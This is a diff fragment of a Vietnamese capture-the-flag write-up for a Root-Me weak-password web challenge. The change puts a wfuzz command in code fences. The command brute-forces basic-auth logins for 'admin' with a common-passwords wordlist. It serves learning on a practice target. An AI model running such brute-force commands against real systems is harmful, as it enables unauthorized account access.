@@ -6,4 +6,4 @@ Vì tên lab là mật khẩu yếu nên tôi thử với vài case cơ bản nh
 
 Hoặc không thì có thể dùng wfuzz để brute force login form
 
-wfuzz -c -w /usr/share/seclists/Passwords/Common-Credentials/top-20-common-SSH-passwords.txt --basic admin:FUZZ http://challenge01.root-me.org/web-serveur/ch3/
+```wfuzz -c -w /usr/share/seclists/Passwords/Common-Credentials/top-20-common-SSH-passwords.txt --basic admin:FUZZ http://challenge01.root-me.org/web-serveur/ch3/```
